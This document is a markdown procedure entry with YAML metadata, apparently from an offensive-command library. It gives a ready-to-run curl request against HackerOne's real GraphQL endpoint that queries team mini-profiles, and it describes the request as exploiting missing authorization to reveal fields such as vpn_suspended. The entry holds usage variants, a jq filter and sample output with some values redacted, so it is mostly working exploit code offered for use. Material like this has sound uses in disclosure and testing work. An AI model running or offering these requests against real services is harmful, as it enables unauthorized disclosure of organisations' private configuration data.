---
data: >-
  curl -X POST 'https://hackerone.com/graphql' -H 'Content-Type:
  application/json' -d '{"query":"query
  Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!)
  {team(handle:$handle_0) {id,...F0}} fragment F0 on Team
  {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,vpn_enabled,vpn_suspended,base_bounty}","variables":{"handle_0":"example-handle","size_1":"small"}}'
tags:
  - graphql
  - api
  - query
type: command
executor: bash
platforms:
  - Web
id: 5fa67cb1-944d-4c3f-a14c-ee2eb6278796
created_at: '2025-12-14T17:26:00.190Z'
updated_at: '2025-12-14T17:26:00.190Z'
verified: false
validated: true
submitted: true
---
# graphql-team-mini-profile-query

## Command

```bash
curl -X POST 'https://hackerone.com/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,vpn_enabled,vpn_suspended,base_bounty}","variables":{"handle_0":"example-handle","size_1":"small"}}'
```

## Description

This command performs a POST request to HackerOne's GraphQL endpoint to query a team's mini-profile, including the vpn_suspended field, using a specified handle and profile picture size. It exploits the lack of authorization to disclose sensitive configuration details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| handle_0 | Team handle to query (String!) | Yes |
| size_1 | Profile picture size (ProfilePictureSizes!, e.g., 'small') | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,vpn_enabled,vpn_suspended,base_bounty}","variables":{"handle_0":"█████","size_1":"small"}}'
```

### Advanced Usage

```bash
# With jq for parsing vpn_suspended
curl -X POST 'https://hackerone.com/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"...","variables":{"handle_0":"another-handle","size_1":"small"}}' | jq '.data.team.vpn_suspended'
```

## Expected Output

JSON object with team data, e.g., {"data":{"team":{"id":"███","name":"████████","about":"███████","_profile_picturePkPpF":"█████","offers_swag":null,"offers_bounties":null,"vpn_enabled":null,"vpn_suspended":true,"base_bounty":null}}}

## Related

- [[Related Procedure]]
